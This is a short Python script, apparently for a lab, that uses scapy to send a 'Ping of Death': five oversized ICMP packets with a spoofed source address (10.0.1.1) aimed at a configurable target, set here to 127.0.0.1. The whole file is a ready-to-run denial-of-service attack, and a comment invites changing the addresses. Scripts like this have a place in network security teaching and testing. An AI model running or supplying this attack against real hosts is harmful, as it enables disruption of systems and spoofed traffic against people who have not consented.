from scapy.all import *

# Change according with the IP addresses being used
SOURCE_IP = "10.0.1.1"
TARGET_IP = "127.0.0.1"
MESSAGE = "T"
NUMBER_PACKETS = 5  # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP) / ICMP() / (MESSAGE * 60000)
send(NUMBER_PACKETS * pingOFDeath)
